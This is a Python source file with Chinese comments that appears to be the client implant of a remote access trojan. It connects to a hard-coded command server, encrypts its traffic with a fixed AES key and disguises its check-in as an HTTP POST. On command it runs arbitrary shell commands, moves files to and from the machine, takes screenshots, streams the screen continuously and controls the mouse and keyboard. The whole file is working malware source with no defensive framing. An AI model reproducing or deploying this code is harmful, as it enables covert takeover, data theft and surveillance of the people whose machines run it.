import asyncio
import base64
import io
import logging
import os
import pyautogui
import sys
import time
import uuid
from PIL import Image
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# 配置日志
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# 配置
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
KEY = b"X7K9P2M5Q8R3T6W1"
CLIENT_ID = f"swiss_{str(uuid.uuid4())}"

# AES 加密
def encrypt_data(data, key):
    try:
        cipher = AES.new(key, AES.MODE_ECB)
        padded_data = pad(data.encode('utf-8'), AES.block_size)
        encrypted = cipher.encrypt(padded_data)
        encoded = base64.b64encode(encrypted).decode('utf-8')
        logger.debug(f"加密: 原始={data[:50]}... -> 加密后={encoded[:50]}...")
        return encoded
    except Exception as e:
        logger.error(f"加密失败: 数据={data[:50]}..., 错误={e}")
        return None

# AES 解密
def decrypt_data(data, key):
    try:
        cipher = AES.new(key, AES.MODE_ECB)
        decoded_data = base64.b64decode(data)
        decrypted = cipher.decrypt(decoded_data)
        unpadded = unpad(decrypted, AES.block_size)
        result = unpadded.decode('utf-8')
        logger.debug(f"解密: 加密后={data[:50]}... -> 解密后={result[:50]}...")
        return result
    except Exception as e:
        logger.error(f"解密失败: 数据={data[:50]}..., 错误={e}")
        return None

# 读取完整数据
async def read_full_data(reader, expected_len):
    data = b""
    while len(data) < expected_len:
        chunk = await reader.read(expected_len - len(data))
        if not chunk:
            raise ConnectionError("数据读取不完整")
        data += chunk
    return data

# 列出文件
def list_files(path):
    try:
        path = path.strip().replace("/", "\\")
        if not os.path.exists(path):
            return f"Error: 系统找不到指定路径: {path}"
        if not os.access(path, os.R_OK):
            return f"Error: 权限不足，无法访问 {path}"
        files = os.listdir(path)
        result = ""
        for f in files:
            full_path = os.path.join(path, f)
            if os.path.isdir(full_path):
                result += f"{f} <DIR>\n"
            else:
                result += f"{f}\n"
        logger.debug(f"列出文件成功: {path}")
        return result
    except Exception as e:
        logger.error(f"列出文件失败: {e}")
        return f"Error: {e}"

# 下载文件
def download_file(path):
    try:
        with open(path, "rb") as f:
            content = base64.b64encode(f.read()).decode('utf-8')
        logger.debug(f"下载文件成功: {path}")
        return content
    except Exception as e:
        logger.error(f"下载文件失败: {e}")
        return f"Error: {e}"

# 上传文件
def upload_file(path, content):
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
        logger.debug(f"上传文件成功: {path}")
        return "上传成功"
    except Exception as e:
        logger.error(f"上传文件失败: {e}")
        return f"Error: {e}"

# 截屏
def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        return img_byte_arr.getvalue()
    except Exception as e:
        logger.error(f"截屏失败: {e}")
        return None

# 获取用户名
def get_whoami():
    try:
        return os.getlogin()
    except Exception as e:
        logger.error(f"获取用户名失败: {e}")
        return f"Error: {e}"

# 处理命令
async def handle_command(command, writer):
    try:
        parts = command.split(" ", 1)
        cmd = parts[0].lower()
        logger.debug(f"收到命令: {command}")

        if cmd == "whoami":
            result = get_whoami()
        elif cmd == "list_files":
            result = list_files(parts[1])
        elif cmd == "download_file":
            result = download_file(parts[1])
        elif cmd == "upload_file":
            sub_parts = parts[1].split(" ", 1)
            result = upload_file(sub_parts[0], sub_parts[1])
        elif cmd == "screenshot":
            img_data = take_screenshot()
            if img_data:
                encrypted_data = encrypt_data(base64.b64encode(img_data).decode(), KEY)
                if encrypted_data:
                    writer.write(f"S:{len(encrypted_data)}:{encrypted_data}".encode())
                    await writer.drain()
                    logger.debug(f"发送截图: {encrypted_data[:50]}...")
            return None
        elif cmd == "control":
            sub_parts = parts[1].split(" ", 1)
            control_type = sub_parts[0]
            if control_type == "mouse_move":
                x, y = map(int, sub_parts[1].split(","))
                pyautogui.moveTo(x, y)
            elif control_type == "mouse_click":
                x, y = map(int, sub_parts[1].split(","))
                pyautogui.click(x, y)
            elif control_type == "key_press":
                pyautogui.press(sub_parts[1])
            result = "控制命令执行成功"
        elif cmd == "ping":
            result = "pong"
        elif cmd == "start_monitor":
            result = "监控已启动"
        elif cmd == "stop_monitor":
            result = "监控已停止"
        else:
            result = os.popen(command).read()

        if result:
            encrypted_result = encrypt_data(result, KEY)
            if encrypted_result:
                writer.write(f"C:{len(encrypted_result)}:{encrypted_result}".encode())
                await writer.drain()
                logger.debug(f"发送命令结果: {encrypted_result[:50]}...")
    except Exception as e:
        logger.error(f"处理命令失败: {e}")
        result = f"Error: {e}"
        encrypted_result = encrypt_data(result, KEY)
        if encrypted_result:
            writer.write(f"C:{len(encrypted_result)}:{encrypted_result}".encode())
            await writer.drain()

# 主循环
async def main():
    while True:
        try:
            logger.info(f"尝试连接到 {SERVER_HOST}:{SERVER_PORT}")
            reader, writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)

            # 发送上线信息
            上线信息 = f"上线信息 (ID: {CLIENT_ID})"
            encrypted_data = encrypt_data(上线信息, KEY)
            if not encrypted_data:
                logger.error("上线信息加密失败")
                await asyncio.sleep(10)
                continue
            disguised_data = f"POST /api/update HTTP/1.1\r\nContent-Length: {len(encrypted_data)}\r\n\r\nC:{len(encrypted_data)}:{encrypted_data}"
            writer.write(disguised_data.encode())
            await writer.drain()
            logger.debug(f"发送上线信息: {disguised_data[:100]}...")

            monitor_active = False
            last_screenshot_time = 0

            while True:
                try:
                    data = await asyncio.wait_for(reader.read(4096), timeout=30)
                except asyncio.TimeoutError:
                    logger.warning("接收数据超时")
                    break

                if not data:
                    logger.warning("服务器断开连接")
                    break

                encrypted_data = data.decode('utf-8', errors='ignore')
                logger.debug(f"接收到的原始数据: {encrypted_data[:100]}...")
                if encrypted_data.startswith("HTTP/1.1 200 OK"):
                    encrypted_data = encrypted_data.split("\r\n\r\n", 1)[1]

                parts = encrypted_data.split(":", 2)
                if len(parts) != 3:
                    logger.error(f"无效数据格式: {encrypted_data[:100]}...")
                    continue
                data_type, data_len_str, encrypted_data = parts
                data_len = int(data_len_str)

                if len(encrypted_data) < data_len:
                    remaining_data = await read_full_data(reader, data_len - len(encrypted_data))
                    encrypted_data += remaining_data.decode('utf-8', errors='ignore')
                    logger.debug(f"补充数据后: {encrypted_data[:100]}...")

                if data_type == "C":
                    command = decrypt_data(encrypted_data, KEY)
                    if not command:
                        logger.error(f"命令解密失败: 原始数据={encrypted_data[:100]}...")
                        continue
                    logger.debug(f"解密命令: {command}")
                    if command.lower() == "start_monitor":
                        monitor_active = True
                        await handle_command(command, writer)
                    elif command.lower() == "stop_monitor":
                        monitor_active = False
                        await handle_command(command, writer)
                    elif command.lower() == "exit":
                        writer.close()
                        await writer.wait_closed()
                        sys.exit(0)
                    else:
                        await handle_command(command, writer)

                if monitor_active:
                    current_time = time.time()
                    if current_time - last_screenshot_time >= 1:
                        img_data = take_screenshot()
                        if img_data:
                            screenshot_encoded = base64.b64encode(img_data).decode()
                            encrypted_data = encrypt_data(screenshot_encoded, KEY)
                            if encrypted_data:
                                writer.write(f"S:{len(encrypted_data)}:{encrypted_data}".encode())
                                await writer.drain()
                                logger.debug(f"发送截图: {encrypted_data[:50]}...")
                        else:
                            logger.error("截图失败，跳过发送")
                        last_screenshot_time = current_time

        except Exception as e:
            logger.error(f"客户端错误: {e}")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())